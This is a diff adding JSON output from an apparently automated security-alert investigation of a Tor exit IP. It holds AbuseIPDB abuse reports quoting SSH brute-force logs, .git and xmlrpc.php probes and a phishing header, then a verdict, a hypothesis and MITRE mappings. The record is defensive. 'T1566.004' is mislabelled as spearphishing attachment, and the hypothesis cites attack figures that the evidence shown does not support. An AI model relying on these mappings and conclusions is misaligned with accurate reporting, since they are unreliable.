+            "reportedAt": "2026-02-13T05:14:48+00:00",
+            "comment": "Blocked by UFW (TCP on 46947)\nSource port: 41473\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-12T06:02:48+00:00",
+            "comment": "Blocked by UFW (TCP on 35967)\nSource port: 54627\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-11T15:54:02+00:00",
+            "comment": "Form spam",
+            "categories": [
+              10
+            ],
+            "reporterId": 86372,
+            "fromIpCountryCode": "AU",
+            "fromIpCountryName": "Australia"
+          },
+          {
+            "reportedAt": "2026-02-10T00:09:51+00:00",
+            "comment": "(mod_security) mod_security (id:210492) triggered by 185.220.101.47 (tor-exit-47.for-privacy.net): 1 in the last 300 secs; Ports: *; Direction: 1; Trigger: LF_MODSEC; Logs: [Mon Feb 09 19:09:43.101014 2026] [security2:error] [pid 28084:tid 28084] [client 185.220.101.47:14661] ModSecurity: Access denied with code 403 (phase 1). Matched phrase \"/.git/\" at REQUEST_URI. [file \"/etc/apache2/conf.d/modsec_vendor_configs/comodo_apache/02_Global_Generic.conf\"] [line \"117\"] [id \"210492\"] [rev \"3\"] [severity \"CRITICAL\"] [tag \"CWAF\"] [tag \"Generic\"] [hostname \"deanandolsek.com\"] [uri \"/.git/config\"] [unique_id \"aYp3R_wgQKszUj2_y-FK-wAAAAo\"]",
+            "categories": [
+              18,
+              19,
+              21
+            ],
+            "reporterId": 56941,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-07T22:13:53+00:00",
+            "comment": "Try to access /xmlrpc.php",
+            "categories": [
+              21
+            ],
+            "reporterId": 25736,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-02-07T13:12:08+00:00",
+            "comment": "Blocked by UFW (TCP on 12941)\nSource port: 57065\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-06T00:14:32+00:00",
+            "comment": "ThreatBook Intelligence: tor_proxy,Zombie more details on https://threatbook.io/ip/185.220.101.47\n2026-02-05 04:00:39 /",
+            "categories": [
+              21
+            ],
+            "reporterId": 56171,
+            "fromIpCountryCode": "CN",
+            "fromIpCountryName": "China"
+          },
+          {
+            "reportedAt": "2026-02-04T13:27:25+00:00",
+            "comment": "Unidentified crawling: not a self-announced bot in user-agent",
+            "categories": [
+              19
+            ],
+            "reporterId": 26072,
+            "fromIpCountryCode": "FR",
+            "fromIpCountryName": "France"
+          },
+          {
+            "reportedAt": "2026-02-03T03:00:34+00:00",
+            "comment": "VM5 Bad user agents ignoring web crawling rules. Draing bandwidth",
+            "categories": [
+              4,
+              19
+            ],
+            "reporterId": 95575,
+            "fromIpCountryCode": "AU",
+            "fromIpCountryName": "Australia"
+          },
+          {
+            "reportedAt": "2026-02-03T00:53:00+00:00",
+            "comment": "ThreatBook Intelligence: tor_proxy,Zombie more details on https://threatbook.io/ip/185.220.101.47",
+            "categories": [
+              22
+            ],
+            "reporterId": 56171,
+            "fromIpCountryCode": "CN",
+            "fromIpCountryName": "China"
+          },
+          {
+            "reportedAt": "2026-02-01T20:02:08+00:00",
+            "comment": "Blocked by UFW (TCP on 6881)\nSource port: 21403\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-01-31T16:20:07+00:00",
+            "comment": "Form spam (honeypot): POST /launch-notification",
+            "categories": [
+              10
+            ],
+            "reporterId": 139729,
+            "fromIpCountryCode": "NL",
+            "fromIpCountryName": "Netherlands"
+          },
+          {
+            "reportedAt": "2026-01-28T18:46:08+00:00",
+            "comment": "Blocked by UFW (TCP on 15440)\nSource port: 12259\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-01-28T01:03:06+00:00",
+            "comment": "ThreatBook Intelligence: tor_proxy,Zombie more details on https://threatbook.io/ip/185.220.101.47",
+            "categories": [
+              22
+            ],
+            "reporterId": 56171,
+            "fromIpCountryCode": "CN",
+            "fromIpCountryName": "China"
+          },
+          {
+            "reportedAt": "2026-01-27T05:51:32+00:00",
+            "comment": "Honeypot [uk-production01]: Unauthorized traffic (314 bytes of payload); 7443 [1] TCP",
+            "categories": [
+              14
+            ],
+            "reporterId": 167826,
+            "fromIpCountryCode": "GB",
+            "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+          },
+          {
+            "reportedAt": "2026-01-26T16:30:08+00:00",
+            "comment": "Failed login attempt detected by Fail2Ban in plesk-postfix jail",
+            "categories": [
+              18
+            ],
+            "reporterId": 153522,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-01-24T13:05:18+00:00",
+            "comment": "Repeated requests on blocked xmlrpc.php, blocked by fail2ban in custom-503-xmlrpc jail",
+            "categories": [
+              19,
+              21
+            ],
+            "reporterId": 169612,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-01-24T08:25:47+00:00",
+            "comment": "Jan 24 08:25:43 s695 sshd[53402]: Failed password for root from 185.220.101.47 port 20365 ssh2\nJan 24 08:25:45 s695 sshd[53409]: Invalid user admin from 185.220.101.47 port 20409\nJan 24 08:25:46 s695 sshd[53402]: Failed password for root from 185.220.101.47 port 20365 ssh2\n...",
+            "categories": [
+              18,
+              22
+            ],
+            "reporterId": 255013,
+            "fromIpCountryCode": "NL",
+            "fromIpCountryName": "Netherlands"
+          },
+          {
+            "reportedAt": "2026-01-24T06:01:06+00:00",
+            "comment": "Form spam",
+            "categories": [
+              10
+            ],
+            "reporterId": 86372,
+            "fromIpCountryCode": "AU",
+            "fromIpCountryName": "Australia"
+          },
+          {
+            "reportedAt": "2026-01-23T04:35:22+00:00",
+            "comment": "Repeated requests on blocked xmlrpc.php, blocked by fail2ban in custom-503-xmlrpc jail",
+            "categories": [
+              19,
+              21
+            ],
+            "reporterId": 169612,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-01-22T23:54:53+00:00",
+            "comment": "2026-01-22T23:54:47.584291+00:00 Linux15 sshd-session[1209360]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-01-22T23:54:49.840594+00:00 Linux15 sshd-session[1209360]: Failed password for invalid user packer from 185.220.101.47 port 32593 ssh2\n2026-01-22T23:54:48.202203+00:00 Linux15 sshd-session[1209383]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-01-22T23:54:49.861602+00:00 Linux15 sshd-session[1209383]: Failed password for invalid user panel from 185.220.101.47 port 32601 ssh2\n2026-01-22T23:54:48.619962+00:00 Linux15 sshd-session[1209399]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-01-22T23:54:50.469607+00:00 Linux15 sshd-session[1209399]: Failed password for invalid user owncloud from 185.220.101.47 port 32609 ssh2\n2026-01-22T23:54:49.552351+00:00 Linux15 sshd-session[1209435]: pam_unix(sshd:\n...",
+            "categories": [
+              18,
+              22
+            ],
+            "reporterId": 60158,
+            "fromIpCountryCode": "FI",
+            "fromIpCountryName": "Finland"
+          }
+        ]
+      },
+      "confidence": "high"
+    }
+  ],
+  "investigation": {
+    "alert_id": "ALRT-2026-0419-001",
+    "verdict": "true_positive",
+    "confidence": "high",
+    "hypothesis": "185.220.101.47, a known Tor exit node with a maximum abuse confidence score of 100/100 and 92 prior abuse reports, launched a credential brute-force attack against SSH (port 22) on prod-web-02.internal. The attack attempted 847 failed authentications across 6 common usernames (root, admin, ubuntu, oracle, postgres, git) in 180 seconds, consistent with automated password-spray activity. This IP has a pattern of similar SSH brute-force attacks documented in abuse reports dating back to January 2026.",
+    "attack_techniques": [
+      "T1110.001 - Brute Force: Password Guessing",
+      "T1110.003 - Brute Force: Password Spraying",
+      "T1566.004 - Phishing: Spearphishing Attachment (historical context from enrichment)"
+    ],
+    "evidence": [
+      {
+        "source_tool": "check_ip_reputation",
+        "claim": "IP 185.220.101.47 has abuse confidence 100/100 (92 reports, country=DE, usage=Fixed Line ISP)",
+        "raw_data": {
+          "ipAddress": "185.220.101.47",
+          "isPublic": true,
+          "ipVersion": 4,
+          "isWhitelisted": false,
+          "abuseConfidenceScore": 100,
+          "countryCode": "DE",
+          "usageType": "Fixed Line ISP",
+          "isp": "Network for Tor-Exit traffic.",
+          "domain": "for-privacy.net",
+          "hostnames": [
+            "tor-exit-47.for-privacy.net"
+          ],
+          "isTor": true,
+          "countryName": "Germany",
+          "totalReports": 92,
+          "numDistinctUsers": 52,
+          "lastReportedAt": "2026-04-22T03:10:28+00:00",
+          "reports": [
+            {
+              "reportedAt": "2026-04-22T03:10:28+00:00",
+              "comment": "DirectAdmin Auto Report (ir-tc.com.log)",
+              "categories": [
+                18,
+                22
+              ],
+              "reporterId": 249233,
+              "fromIpCountryCode": "FR",
+              "fromIpCountryName": "France"
+            },
+            {
+              "reportedAt": "2026-04-18T22:00:32+00:00",
+              "comment": "Report By Secure Gateway Security Team: Unsolicited Connection Attempt",
+              "categories": [
+                15
+              ],
+              "reporterId": 113419,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-04-18T22:00:32+00:00",
+              "comment": "Report By ALSCO Security Team: Unauthorized Connection Attempt",
+              "categories": [
+                16
+              ],
+              "reporterId": 125807,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-04-18T11:59:02+00:00",
+              "comment": "This IP was involved in an brute force and password spray attack on 2026/04/18 06:57:50",
+              "categories": [
+                14,
+                18,
+                20,
+                21
+              ],
+              "reporterId": 171176,
+              "fromIpCountryCode": "IE",
+              "fromIpCountryName": "Ireland"
+            },
+            {
+              "reportedAt": "2026-04-18T04:33:00+00:00",
+              "comment": "Many_bad_calls",
+              "categories": [
+                21
+              ],
+              "reporterId": 11273,
+              "fromIpCountryCode": "BE",
+              "fromIpCountryName": "Belgium"
+            },
+            {
+              "reportedAt": "2026-04-17T11:31:28+00:00",
+              "comment": "2026-04-17T13:31:16.978548+02:00 Linux11 sshd-session[2914766]: Invalid user ftp from 185.220.101.47 port 4231\n2026-04-17T13:31:18.663978+02:00 Linux11 sshd-session[2914646]: Failed password for invalid user ftproot from 185.220.101.47 port 28061 ssh2\n2026-04-17T13:31:17.159627+02:00 Linux11 sshd-session[2914766]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-04-17T13:31:18.756999+02:00 Linux11 sshd-session[2914766]: Failed password for invalid user ftp from 185.220.101.47 port 4231 ssh2\n2026-04-17T13:31:19.951202+02:00 Linux11 sshd-session[2914888]: Invalid user ftproot from 185.220.101.47 port 4233\n2026-04-17T13:31:21.134985+02:00 Linux11 sshd-session[2914646]: Failed password for invalid user ftproot from 185.220.101.47 port 28061 ssh2\n2026-04-17T13:31:20.103413+02:00 Linux11 sshd-session[2914888]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-04-17T13:31:22.11\n...",
+              "categories": [
+                18,
+                22
+              ],
+              "reporterId": 60158,
+              "fromIpCountryCode": "FI",
+              "fromIpCountryName": "Finland"
+            },
+            {
+              "reportedAt": "2026-04-15T11:43:44+00:00",
+              "comment": "Automatic report for brute force attack",
+              "categories": [
+                19
+              ],
+              "reporterId": 278024,
+              "fromIpCountryCode": "IT",
+              "fromIpCountryName": "Italy"
+            },
+            {
+              "reportedAt": "2026-04-15T00:50:08+00:00",
+              "comment": "Blocked by UFW (TCP on 56143)\nSource port: 46427\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-04-15T00:36:10+00:00",
+              "comment": "Rule : PLESK BOT\n2026-04-15 02:08:09 Unauthorized login attempt to Plesk Panel from IP 185.220.101.47 with username admin",
+              "categories": [
+                15,
+                18,
+                21
+              ],
+              "reporterId": 143920,
+              "fromIpCountryCode": "FR",
+              "fromIpCountryName": "France"
+            },
+            {
+              "reportedAt": "2026-04-14T03:52:07+00:00",
+              "comment": "Honeypot [honeypot-ca-sensor1]: SMB traffic on port 445",
+              "categories": [
+                15
+              ],
+              "reporterId": 76245,
+              "fromIpCountryCode": "CA",
+              "fromIpCountryName": "Canada"
+            },
+            {
+              "reportedAt": "2026-04-13T18:34:47+00:00",
+              "comment": "Form spam",
+              "categories": [
+                10
+              ],
+              "reporterId": 86372,
+              "fromIpCountryCode": "AU",
+              "fromIpCountryName": "Australia"
+            },
+            {
+              "reportedAt": "2026-04-08T09:15:15+00:00",
+              "comment": "2026-04-08T10:15:14+01:00 NAS [Wed Apr 08 10:15:14.620370 2026] [authz_core:error] [pid 6878:tid 6908] [client 185.220.101.47:38960] AH01630: client denied by server configuration: /var/services/web/.DS_Store\n...",
+              "categories": [
+                18,
+                15
+              ],
+              "reporterId": 13399,
+              "fromIpCountryCode": "GB",
+              "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+            },
+            {
+              "reportedAt": "2026-04-08T05:02:08+00:00",
+              "comment": "2026-04-08T05:01:10.494348+00:00 Linux13 sshd-session[2510502]: Failed password for invalid user newuser from 185.220.101.47 port 64531 ssh2\n2026-04-08T05:01:10.562968+00:00 Linux13 sshd-session[2510651]: Invalid user newuser from 185.220.101.47 port 64537\n2026-04-08T05:01:12.629351+00:00 Linux13 sshd-session[2510502]: Failed password for invalid user newuser from 185.220.101.47 port 64531 ssh2\n2026-04-08T05:01:10.836637+00:00 Linux13 sshd-session[2510651]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-04-08T05:01:13.513350+00:00 Linux13 sshd-session[2510651]: Failed password for invalid user newuser from 185.220.101.47 port 64537 ssh2\n2026-04-08T05:01:14.536344+00:00 Linux13 sshd-session[2510502]: Failed password for invalid user newuser from 185.220.101.47 port 64531 ssh2\n2026-04-08T05:01:16.784353+00:00 Linux13 sshd-session[2510502]: Failed password for invalid user newuser from 185.220.101.47 port 64531 ssh2\n2026-04-08T0\n...",
+              "categories": [
+                18,
+                22
+              ],
+              "reporterId": 60158,
+              "fromIpCountryCode": "FI",
+              "fromIpCountryName": "Finland"
+            },
+            {
+              "reportedAt": "2026-04-07T19:45:12+00:00",
+              "comment": "Plesk panel login attempt with forbidden username (root/admin), blocked by Fail2Ban in custom-plesk-login jail",
+              "categories": [
+                18,
+                21
+              ],
+              "reporterId": 169612,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-04-06T21:00:00+00:00",
+              "comment": "",
+              "categories": [
+                11,
+                7
+              ],
+              "reporterId": 286706,
+              "fromIpCountryCode": "IL",
+              "fromIpCountryName": "Israel"
+            },
+            {
+              "reportedAt": "2026-04-04T23:41:11+00:00",
+              "comment": "Rule : PLESK BOT\n2026-04-04 17:40:15 Unauthorized login attempt to Plesk Panel from IP 185.220.101.47 with username admin",
+              "categories": [
+                15,
+                18,
+                21
+              ],
+              "reporterId": 143920,
+              "fromIpCountryCode": "FR",
+              "fromIpCountryName": "France"
+            },
+            {
+              "reportedAt": "2026-04-04T03:20:03+00:00",
+              "comment": "Website Scanning / Scraping",
+              "categories": [
+                19,
+                20,
+                21
+              ],
+              "reporterId": 152128,
+              "fromIpCountryCode": "IT",
+              "fromIpCountryName": "Italy"
+            },
+            {
+              "reportedAt": "2026-04-02T21:43:34+00:00",
+              "comment": "Web App Attack",
+              "categories": [
+                21
+              ],
+              "reporterId": 15911,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-04-02T09:43:59+00:00",
+              "comment": "HTTP vulnerability scanning",
+              "categories": [
+                21
+              ],
+              "reporterId": 258806,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-03-31T20:06:56+00:00",
+              "comment": "SQL Injection, Web App Attack, suspicious: SQLi, SQLi (encoding)",
+              "categories": [
+                16,
+                21
+              ],
+              "reporterId": 274897,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-29T22:06:11+00:00",
+              "comment": "Common web attack from 185.220.101.47.",
+              "categories": [
+                21
+              ],
+              "reporterId": 147222,
+              "fromIpCountryCode": "FR",
+              "fromIpCountryName": "France"
+            },
+            {
+              "reportedAt": "2026-03-29T05:30:02+00:00",
+              "comment": "2026-03-29 05:30:02 UTC Unauthorized activity to TCP port 22. SSH",
+              "categories": [
+                22
+              ],
+              "reporterId": 56992,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-28T03:00:42+00:00",
+              "comment": "Rule : PLESK BOT\n2026-03-27 18:07:21 Unauthorized login attempt to Plesk Panel from IP 185.220.101.47 with username root",
+              "categories": [
+                15,
+                18,
+                21
+              ],
+              "reporterId": 216703,
+              "fromIpCountryCode": "FR",
+              "fromIpCountryName": "France"
+            },
+            {
+              "reportedAt": "2026-03-27T07:58:53+00:00",
+              "comment": "2026-03-27 07:58:53 UTC | \ud83d\udcb3 Bitcoin Cash Post- | badkitti77@gxmail.to | http://telegra.ph/Blockchaincom-03-17-6 | 185.220.101.47 | Mozilla/5.0 (Linux; Android 4.1.1; G2SMNT Build/JRO03C-AOC-BZ-20140826) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Safari/537.36 | 1m2wbe | comment",
+              "categories": [
+                12
+              ],
+              "reporterId": 12478,
+              "fromIpCountryCode": "GB",
+              "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+            },
+            {
+              "reportedAt": "2026-03-26T18:14:11+00:00",
+              "comment": "[HP01-SRV01-FR] Blocked by SysWarden Firewall (Port Scan / Probing Port 553)",
+              "categories": [
+                14
+              ],
+              "reporterId": 133059,
+              "fromIpCountryCode": "FR",
+              "fromIpCountryName": "France"
+            },
+            {
+              "reportedAt": "2026-03-26T12:57:15+00:00",
+              "comment": "Form spam",
+              "categories": [
+                10
+              ],
+              "reporterId": 86372,
+              "fromIpCountryCode": "GB",
+              "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+            },
+            {
+              "reportedAt": "2026-03-25T13:02:08+00:00",
+              "comment": "Blocked by UFW (TCP on 5467)\nSource port: 38719\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-22T09:30:13+00:00",
+              "comment": "Web App Attack",
+              "categories": [
+                18,
+                21
+              ],
+              "reporterId": 183137,
+              "fromIpCountryCode": "FR",
+              "fromIpCountryName": "France"
+            },
+            {
+              "reportedAt": "2026-03-21T21:41:28+00:00",
+              "comment": "Blocked by UFW (TCP on 1)\nSource port: 55535\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-18T21:17:05+00:00",
+              "comment": "request_uri: / -- automatic report --",
+              "categories": [
+                18,
+                15
+              ],
+              "reporterId": 73463,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-03-17T19:03:02+00:00",
+              "comment": "2026-03-17 10:00:45,571 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47\n2026-03-17 13:00:27,570 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47\n2026-03-17 16:00:20,065 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47\n2026-03-17 19:00:52,881 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47\n2026-03-17 21:02:21,317 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47",
+              "categories": [
+                18
+              ],
+              "reporterId": 276232,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-03-17T10:14:25+00:00",
+              "comment": "Try to access /xmlrpc.php",
+              "categories": [
+                21
+              ],
+              "reporterId": 25736,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-03-16T08:19:26+00:00",
+              "comment": "Blocking for trying to access an exploit file: /myagent.site",
+              "categories": [
+                15
+              ],
+              "reporterId": 20490,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-15T05:50:33+00:00",
+              "comment": "Connection to port 443 with data transfer.\nData preview: \u0016\u0003\u0001",
+              "categories": [
+                14,
+                15
+              ],
+              "reporterId": 246098,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-14T05:31:26+00:00",
+              "comment": "185.220.101.47 - - [14/Mar/2026:06:31:26 +0100] \"GET /.git/HEAD HTTP/1.1\" 404 3208 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\"\n...",
+              "categories": [
+                7,
+                18,
+                21
+              ],
+              "reporterId": 136589,
+              "fromIpCountryCode": "NL",
+              "fromIpCountryName": "Netherlands"
+            },
+            {
+              "reportedAt": "2026-03-13T05:37:29+00:00",
+              "comment": "2026-03-13T13:36:29.950991 honorable-confusion sshd[914785]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-03-13T13:36:31.855803 honorable-confusion sshd[914785]: Failed password for invalid user administrator from 185.220.101.47 port 61811 ssh2\n...",
+              "categories": [
+                18,
+                22
+              ],
+              "reporterId": 198075,
+              "fromIpCountryCode": "TW",
+              "fromIpCountryName": "Taiwan"
+            },
+            {
+              "reportedAt": "2026-03-13T00:17:16+00:00",
+              "comment": "185.220.101.47 - - [12/Mar/2026:18:17:12 -0600] \"GET /xmlrpc.php?rsd HTTP/2.0\" 200 768 \"https://dooce.com/xmlrpc.php?rsd\" \"Mozilla/5.0 (Linux; Android 9; FLA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36\"\n...",
+              "categories": [
+                21
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-13T00:11:28+00:00",
+              "comment": "Form spam",
+              "categories": [
+                10
+              ],
+              "reporterId": 86372,
+              "fromIpCountryCode": "AU",
+              "fromIpCountryName": "Australia"
+            },
+            {
+              "reportedAt": "2026-03-12T16:21:48+00:00",
+              "comment": "Blocked by UFW (TCP on 31909)\nSource port: 42517\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-12T07:10:03+00:00",
+              "comment": "IP banned by Fail2Ban in jail nginx-abusive-ips",
+              "categories": [
+                21,
+                18,
+                19
+              ],
+              "reporterId": 190082,
+              "fromIpCountryCode": "IT",
+              "fromIpCountryName": "Italy"
+            },
+            {
+              "reportedAt": "2026-03-11T18:32:07+00:00",
+              "comment": "SSH Bruteforce attempt with erpnext:erpnext on company server",
+              "categories": [
+                18,
+                22,
+                15
+              ],
+              "reporterId": 239738,
+              "fromIpCountryCode": "FR",
+              "fromIpCountryName": "France"
+            },
+            {
+              "reportedAt": "2026-03-09T21:47:48+00:00",
+              "comment": "Blocked by UFW (TCP on 35918)\nSource port: 39835\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-09T00:14:06+00:00",
+              "comment": "2026-03-08T20:14:03.436363 MikuHK sshd[657093]: Invalid user administrator from 185.220.101.47 port 17693\n2026-03-08T20:14:03.498784 MikuHK sshd[657130]: Invalid user administrator from 185.220.101.47 port 17699\n...",
+              "categories": [
+                18,
+                22
+              ],
+              "reporterId": 198075,
+              "fromIpCountryCode": "HK",
+              "fromIpCountryName": "Hong Kong"
+            },
+            {
+              "reportedAt": "2026-03-08T21:45:03+00:00",
+              "comment": "Repeated requests on blocked xmlrpc.php, blocked by fail2ban in custom-503-xmlrpc jail",
+              "categories": [
+                19,
+                21
+              ],
+              "reporterId": 169612,
+              "fromIpCountryCode": "DE",
+              "fromIpCountryName": "Germany"
+            },
+            {
+              "reportedAt": "2026-03-08T21:05:21+00:00",
+              "comment": "Brute Force, tcp/22",
+              "categories": [
+                18
+              ],
+              "reporterId": 191328,
+              "fromIpCountryCode": "TR",
+              "fromIpCountryName": "Turkey"
+            },
+            {
+              "reportedAt": "2026-03-07T06:11:28+00:00",
+              "comment": "Blocked by UFW (TCP on 37230)\nSource port: 15839\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-05T17:34:00+00:00",
+              "comment": "phishing attempt from 127.0.0.1 ([185.220.101.47])\r\nSubject: Re: PLEASE ENSURE THAT ALL REQUIRED STEPS ARE FULFILLED TO RECEIVE YOUR PAYMENT\r\nDate: Thu, 5 Mar 2026 22:29:36 +0500\r\nAction must be taken before time expires.\r\nContent-Type: application/octet-stream; name=\"xejwuyqxbl.pdf\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"xejwuyqxbl.pdf\"\r\n",
+              "categories": [
+                11,
+                17,
+                20,
+                7
+              ],
+              "reporterId": 13286,
+              "fromIpCountryCode": "GB",
+              "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+            },
+            {
+              "reportedAt": "2026-03-05T00:56:02+00:00",
+              "comment": "Mail - Multiple failed login attempts",
+              "categories": [
+                18,
+                20
+              ],
+              "reporterId": 152128,
+              "fromIpCountryCode": "IT",
+              "fromIpCountryName": "Italy"
+            },
+            {
+              "reportedAt": "2026-03-04T11:19:28+00:00",
+              "comment": "Blocked by UFW (TCP on 64696)\nSource port: 37823\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-03T19:39:08+00:00",
+              "comment": "Blocked by UFW (TCP on 61227)\nSource port: 59829\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+              "categories": [
+                14
+              ],
+              "reporterId": 209271,
+              "fromIpCountryCode": "US",
+              "fromIpCountryName": "United States of America"
+            },
+            {
+              "reportedAt": "2026-03-03T03:46:34+00:00",
+              "comment": "Brute force",
+              "categories": [
+                18
+              ],
+              "reporterId": 156990,
+              "fromIpCountryCode": "ES",
